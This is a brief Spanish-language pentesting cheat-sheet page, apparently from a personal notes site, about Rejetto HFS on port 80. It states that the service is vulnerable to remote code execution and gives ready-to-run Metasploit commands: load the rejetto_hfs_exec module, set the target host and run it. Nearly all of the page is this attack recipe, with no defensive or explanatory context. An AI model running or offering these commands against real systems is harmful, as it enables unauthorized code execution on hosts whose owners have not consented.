---
title: "Rejetto HFS (80)"
layout: "single"
category: "Servicios"
slug: "servicios/hfs"
date: "2025-11-26"
---

### RCE (Metasploit)
Rejetto HFS es vulnerable a RCE.
```bash
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS <IP>
run
```
